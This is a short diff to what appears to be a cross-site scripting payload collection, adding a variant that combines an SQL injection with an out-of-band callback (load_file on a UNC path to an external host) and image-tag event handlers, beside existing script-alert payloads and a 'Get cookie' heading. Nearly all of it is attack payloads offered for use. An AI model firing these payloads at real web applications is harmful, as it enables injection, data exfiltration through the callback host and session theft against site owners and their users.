@@ -14,11 +14,14 @@ qnlxv"><script>alert('hello from nu11secur1ty')</script>sad4r
 ```
 <div><image src=validateNonExistantImage.png onloadstart=alert(1337)>hello from nu11secur1ty</div>
 ```
-## ExistantImage
+## ExistantImage + ENCODED
 ```
 <div><image src=https://raw.githubusercontent.com/nu11secur1ty/XSSight/master/XSS-image/image/kostaakatil.webp onloadstart=alert(1337)>hello from nu11secur1ty</div>
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 bbbb'+(select load_file('\\\\716gb1cfe9gkja4zdj45qxx9208vwlkcn0en6bv.stupid.com\\nbq'))+'t8xqv<div><image src=https://media.giphy.com/media/bTByutamJSjhS/giphy.gif onloadstart=alert(1337)>hello from nu11secur1ty</div></script>uou2
+------------------------------------------------------------------------------------------------------------------------------------------------------
+bbbb'+(select load_file('\\\\716gb1cfe9gkja4zdj45qxx9208vwlkcn0en6bv.stupid.com\\nbq'))+'t8xqv<div><image src=https://media.tenor.com/-K9sHxXAb-cAAAAC/shame-on-you-patricia.gif onloadstart=alert(1337)>hello from nu11secur1ty</div></script>uou2
+
 ```
 
 ## Get cookie
